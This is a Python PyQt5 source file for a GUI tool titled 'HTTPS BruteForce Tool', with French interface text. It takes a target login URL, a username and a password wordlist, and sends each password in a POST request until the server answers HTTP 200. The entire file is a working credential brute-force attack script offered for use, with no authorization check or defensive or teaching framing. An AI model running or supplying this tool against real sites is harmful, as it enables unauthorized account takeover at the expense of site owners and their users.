import sys
import requests
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit,
    QPushButton, QTextEdit, QVBoxLayout, QMessageBox
)
from PyQt5.QtGui import QFont

class BruteForceGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("🧠 HTTPS BruteForce Tool")
        self.setGeometry(100, 100, 600, 450)
        self.setStyleSheet("background-color: #0f0f0f; color: #00ffcc;")
        
        layout = QVBoxLayout()

        self.label_url = QLabel("🌐 URL cible (ex: https://site.com/login)")
        self.label_url.setFont(QFont("Arial", 10))
        layout.addWidget(self.label_url)
        self.input_url = QLineEdit()
        layout.addWidget(self.input_url)

        self.label_user = QLabel("👤 Identifiant")
        layout.addWidget(self.label_user)
        self.input_user = QLineEdit()
        layout.addWidget(self.input_user)

        self.label_wordlist = QLabel("📂 Chemin vers la wordlist")
        layout.addWidget(self.label_wordlist)
        self.input_wordlist = QLineEdit()
        layout.addWidget(self.input_wordlist)

        self.start_button = QPushButton("🚀 Lancer le brute-force")
        self.start_button.setStyleSheet("background-color: #222; color: #00ffcc;")
        self.start_button.clicked.connect(self.launch_attack)
        layout.addWidget(self.start_button)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        self.setLayout(layout)

    def launch_attack(self):
        url = self.input_url.text()
        username = self.input_user.text()
        wordlist_path = self.input_wordlist.text()

        if not url or not username or not wordlist_path:
            self.show_error("❌ Remplis tous les champs.")
            return

        try:
            with open(wordlist_path, 'r') as f:
                passwords = f.readlines()
        except FileNotFoundError:
            self.show_error("❌ Fichier introuvable.\n💡 Vérifie le chemin de ta wordlist.")
            return
        except Exception as e:
            self.show_error(f"❌ Erreur lors de l'ouverture : {str(e)}")
            return

        self.output.append(f"🔍 Démarrage du brute-force sur {url}")
        for pwd in passwords:
            pwd = pwd.strip()
            try:
                data = {'username': username, 'password': pwd}
                response = requests.post(url, data=data, timeout=5)
                status = response.status_code
                self.output.append(f"🔐 Test: {pwd} | Code HTTP: {status}")
                if status == 200:
                    self.output.append(f"✅ Mot de passe trouvé : {pwd}")
                    break
            except requests.exceptions.ConnectionError:
                self.output.append("❌ Erreur de connexion. Vérifie l’URL.")
                break
            except requests.exceptions.Timeout:
                self.output.append("⌛ Temps écoulé. Le serveur est peut-être lent.")
            except Exception as e:
                self.output.append(f"⚠️ Erreur inconnue : {str(e)}")
                break

    def show_error(self, message):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Critical)
        msg.setText("Erreur")
        msg.setInformativeText(message)
        msg.setWindowTitle("Erreur détectée")
        msg.exec_()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = BruteForceGUI()
    window.show()
    sys.exit(app.exec_())
